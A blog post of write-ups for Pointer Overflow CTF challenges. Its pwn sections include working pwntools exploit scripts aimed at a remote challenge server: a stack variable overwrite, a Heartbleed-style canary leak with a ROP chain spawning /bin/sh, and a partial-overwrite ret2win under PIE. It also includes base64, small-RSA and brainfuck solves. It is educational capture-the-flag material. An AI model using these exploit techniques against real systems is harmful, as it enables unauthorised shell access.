---
title: "pointer overflow ctf"
date: 2023-11-05T16:56:10+10:00
draft: false
toc: false
Summary: "pointer overflow ctf"
images:
tags:
  - pwn
  - ctf
---

I have been working away at some challenge on https://pointeroverflowctf.com/ which runs over a few months. They already have a winner and would let people start writing up solves. Here are a few of mine so far, was good to get some pwn solves! 

### My freind a lonesome worm

For this challenge we are given a program and told why pick the lock when we can remove the hinges. Having a look in ghidra we get the decomplied code.

```c
{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  int local_1c;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_38 = 0x3332317473657547;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_1c = 999;
  init(param_1);
  printf("Welcome, you are logged in as \'%s\'\n",&local_38);
  do {
    while( true ) {
      while( true ) {
        printf("\nHow can I help you, %s?\n",&local_38);
        puts(" (1) Change username");
        puts(" (2) Switch to root account");
        puts(" (3) Start a debug shell");
        printf("Choice: ");
        iVar1 = get_int();
        if (iVar1 != 1) break;
        printf("Enter new username: ");
        __isoc99_scanf(&DAT_001020c6,&local_38);
      }
      if (iVar1 != 2) break;
      puts("Sorry, root account is currently disabled");
    }
    if (iVar1 == 3) {
      if (local_1c == 999) {
        puts("Sorry, guests aren\'t allowed to use the debug shell");
      }
      else if (local_1c == 0x539) {
        puts("Starting debug shell");
        execl("/bin/bash","/bin/bash",0);
      }
      else {
        puts("Unrecognized user type");
      }
    }
    else {
      puts("Unknown option");
    }
  } while( true );
}
```

Looks like we need to write over `local_1c` this can be done when we enter a new username in to `&local_38`. Initally I was having some trouble as the offsets had changed to due allignment but after figuring out the write offset we can get our shell.

```python3
from pwn import *
from pwnlib.util.packing import *

payload = b'A' * 0x1c + p64(0x539, endian='little')

r = remote('34.123.210.162', 20232)

r.recvuntil(b'Choice: ')
r.sendline(b'1')
r.recvuntil(b'Enter new username: ')
r.sendline(payload)
r.interactive()
```


### Unquestioned and Unrestrained
We are given a cipher text but not how it was encrypted. Looked like base64 so that was an easy solve.
`cG9jdGZ7dXdzcF80MTFfeTB1Ml84NDUzXzQyM184MzEwbjlfNzBfdTV9`
`poctf{uwsp_411_y0u2_8453_423_8310n9_70_u5}`

### A Pale, Violet Light
We are given the following details.
```
e= 5039

N = 34034827

C = 933969 15848125 24252056 5387227 5511551 10881790 3267174 14500698 28242580 933969 32093017 18035208 2594090 2594090 9122397 21290815 15930721 4502231 5173234 21290815 23241728 2594090 21290815 18035208 10891227 15930721 202434 202434 21290815 5511551 202434 4502231 5173234 25243036
```

Given that we have and e, N and C we know its RSA. The N value looks particularly small so if we can factor it we can recreate the private key.

https://www.alpertron.com.ar/ECM.HTM

looks like our p and q can be `34 034827 = 5807 × 5861` and we can re-create the private key.

```python3
from Crypto.Util.number import inverse
e = 5039
N = 34034827
p = 5807
q = 5861
phi = (p-1)*(q-1)
d = inverse(e, phi)
c = 933969
m = pow(c, d, N)

C = "933969 15848125 24252056 5387227 5511551 10881790 3267174 14500698 28242580 933969 32093017 18035208 2594090 2594090 9122397 21290815 15930721 4502231 5173234 21290815 23241728 2594090 21290815 18035208 10891227 15930721 202434 202434 21290815 5511551 202434 4502231 5173234 25243036"

for i in C.split():
    print(chr(pow(int(i), d, N)), end='')
```

`poctf{uwsp_533k 4nd y3 5h411 f1nd} `

## Missing and missed.
We are given some brainf**k to run.
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.-.------------.+++++++++++++++++.--------------.+++++++++++++++++++++.------.++.----.---.-----------------.<<++++++++++++++++++++.-.++++++++.>>+++++++++.<<--.>>---------.++++++++++++++++++++++++.<<-----.--.>>---------.<<+++++++++.>>---------------.<<---------.++.>>.+++++++.<<--.++.+++++++.---------.+++++++..----.>>++++++++.+++++++++++++++.
```
poctf{uwsp_219h7_w20n9_02_f0290773n}


## Guilded lily

We are given a binary and told its meant to emulate Heartbleed. Lets have a look at main.

``` c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  int local_41c;
  undefined local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("Heartbleed Bug Simulator (CVE-2014-0160)");
  puts("  info: https://heartbleed.com/");
  do {
    puts("\nWaiting for heart beat request...");
    __isoc99_scanf(" %d:%s",&local_41c,local_418);
    puts("Sending heart beat response...");
    write(1,local_418,(long)local_41c);
  } while (0 < local_41c);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

Throwing this into ropgadget reveals we have an execve chain but looks like we cant just overwrite the return address as there is a stack canary. The program takes a number and a string. The number being the amount of bytes to write and the string which is put into the buffer `local_418` but we can write out more bytes than the buffer and leak the canary.

I tried the following input.
```
payload = b'1044:'+ b'A'*1032
```

I could see the canaray was at $RBP-0x8 so I compared it in gdb to what was printed to the console.


```\x00\x86\xd1\x83\xdba\xe3```

```0x7fff3cac1a18:	0x00	0x86	0xd1	0x83	0xdb	0x61	0xe3	0x22```

I often saw that the canary value I got in memory was not what was represented in the text output.

After staring at this for a while I noticed that some of the bytes in hex were the string representation in ascii. After this clicked it made it easier to read the canary.

Now I was able to read the canary I could try overwrite the return address, using cyclic I could see the offset I needed and append the rop chain.

```python
from pwn import *

r = remote('34.123.210.162', 20233)

from struct import pack

p = b''

p += pack('<Q', 0x000000000040f30e) # pop rsi ; ret
p += pack('<Q', 0x00000000004df0e0) # @ .data
p += pack('<Q', 0x0000000000451fd7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000499b65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f30e) # pop rsi ; ret
p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
p += pack('<Q', 0x000000000044c190) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000499b65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004018e2) # pop rdi ; ret
p += pack('<Q', 0x00000000004df0e0) # @ .data
p += pack('<Q', 0x000000000040f30e) # pop rsi ; ret
p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
p += pack('<Q', 0x00000000004017ef) # pop rdx ; ret
p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
p += pack('<Q', 0x000000000044c190) # xor rax, rax ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012e3) # syscall

r.readuntil('request...\n')
payload = b'1044:'+ b'A'*1032
r.sendline(payload)
r.readuntil('A'*1032)
canary = r.read(8)
input_bytes = canary
output_bytes = []

for byte in input_bytes:
    output_bytes.append(f'0x{byte:02x}')

payload = b'0:'+ b'A'*1032 + canary + b'aaaabaaa' + p

r.readuntil('request...\n')
r.sendline(payload)
r.interactive()
```

I got a shell on the remote terminal and the flag.

```poctf{uwsp_4_57udy_1n_5c42137}```

## Time is but a window

This one looked the classic ret2win function but there was a little twist. checksec shows that we have PIE turned on so addresses meaning we cant just jump. I tried leaking the return address but did not have any luck so I just tried overwriting the last byte of the return address to be the win function.

I found a good article about bypassing pie and other techniques.

https://www.appknox.com/security/bypassing-pie-nx-and-aslr

```c
void greet(void)

{
  undefined input [16];
  
  printf("Hello! What\'s your name?: ");
  get_string(input);
  printf("Nice to meet you %s!\n",input);
  return;
}

```
```c
void win(void)
{
  alarm(0);
  execl("/bin/bash","/bin/bash",0);
  return;
}

```

```python3
from pwn import *
from pwn import p64

r = remote('34.123.210.162', 20234)
offset = cyclic_find("gaa")
r.readuntil('name?:')
r.sendline(b'A'*offset + b"\xcb")
r.interactive()
```

```bash
 Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAA\xcb\xb5{~U!
$ ls
exploit3.bin
flag.txt
$ cat ./flag.txt
poctf{uwsp_71m3_15_4_f4c702} 
```